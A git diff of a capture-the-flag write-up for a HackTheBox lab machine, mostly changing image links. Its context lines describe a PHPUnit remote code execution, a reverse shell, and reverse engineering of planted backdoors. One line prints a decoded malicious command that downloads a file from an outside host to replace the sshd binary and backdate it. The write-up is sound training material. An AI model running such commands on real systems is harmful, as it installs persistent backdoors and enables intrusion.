@@ -19,15 +19,15 @@ PORT   STATE SERVICE
 
 The website is a company page:
 
-![](<../../../.gitbook/assets/image%20(630).png>)
+![](../../../.gitbook/assets/undetected-15.png)
 
 If we try to Visit Store, we get redirected to `store.djewelry.htb`. The store page is identical to the original, but it has more functionalities:
 
-![](<../../../.gitbook/assets/image%20(1927).png>)
+![](../../../.gitbook/assets/undetected-5.png)
 
 I tried adding products to the cart and maybe finding an exploit pertaining to that, but it was disabled.
 
-![](<../../../.gitbook/assets/image%20(2444).png>)
+![](../../../.gitbook/assets/undetected-7.png)
 
 Since there's no functionalities on this site, let's run a `feroxbuster` directory scan.
 
@@ -62,7 +62,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 When we view the `/vendor` endpoint, we see a file system with different PHP libraries:
 
-![](<../../../.gitbook/assets/image%20(3572).png>)
+![](../../../.gitbook/assets/undetected-11.png)
 
 Searching for exploits for each of them leads me an RCE for PHPUnit:
 
@@ -70,11 +70,11 @@ Searching for exploits for each of them leads me an RCE for PHPUnit:
 
 This works:
 
-![](<../../../.gitbook/assets/image%20(2716).png>)
+![](../../../.gitbook/assets/undetected-8.png)
 
 Then, use a `bash` one-liner to get a reverse shell.
 
-![](<../../../.gitbook/assets/image%20(3242).png>)
+![](../../../.gitbook/assets/undetected-10.png)
 
 ## Privilege Escalation
 
@@ -102,15 +102,15 @@ We can transfer this back to my machine for some reverse engineering via `ghidra
 
 There are a lot of functions within this function:
 
-![](<../../../.gitbook/assets/image%20(3774).png>)
+![](../../../.gitbook/assets/undetected-12.png)
 
 Out of all the functions, `exec_shell` is the most unique because it actually executes something.
 
-![](<../../../.gitbook/assets/image%20(1565).png>)
+![](../../../.gitbook/assets/undetected-3.png)
 
 We can see the `-c` flag, and it is passed to `execve`, which means that some commands are being executed here. However, `ghidra` is unable to to see what is being executed. When we open it up in `ida64`, we can see a huge chunk of hex.
 
-![](<../../../.gitbook/assets/image%20(1281).png>)
+![](../../../.gitbook/assets/undetected-1.png)
 
 When converted to a string, it gives this:
 
@@ -152,13 +152,13 @@ Session completed.
 
 Reading the code, it seems to make the user `$user"1"`, which means it is `steven1` in this case. We can then `ssh` in as `steven1` using this password:
 
-![](<../../../.gitbook/assets/image%20(1437).png>)
+![](../../../.gitbook/assets/undetected-2.png)
 
 ### Mod\_Reader.o RE
 
 Running LinPEAS reveals there is mail for the user:
 
-![](<../../../.gitbook/assets/image%20(3810).png>)
+![](../../../.gitbook/assets/undetected-13.png)
 
 ```
 steven@production:~$ cat /var/mail/steven
@@ -203,11 +203,11 @@ The rest of the files were about 500 bytes, meanwhile this thing was massive. We
 
 Then, using `ida64`, we see that there are base64 related functions for this:
 
-![](<../../../.gitbook/assets/image%20(448).png>)
+![](../../../.gitbook/assets/undetected-14.png)
 
 We can locate the string and see that it is being passed into another `bash -c` command:
 
-![](<../../../.gitbook/assets/image%20(1729).png>)
+![](../../../.gitbook/assets/undetected-4.png)
 
 When decoded, it shows this:
 
@@ -221,7 +221,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
-![](<../../../.gitbook/assets/image%20(3115).png>)
+![](../../../.gitbook/assets/undetected-9.png)
 
 This might contain the credentials for `root`.
 
@@ -289,4 +289,4 @@ Afterwards, we just need to convert this to a string, XOR it with `0x96`, then r
 
 This would give us the string `@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3`, which is the `root` password:
 
-![](<../../../.gitbook/assets/image%20(2001).png>)
+![](../../../.gitbook/assets/undetected-6.png)
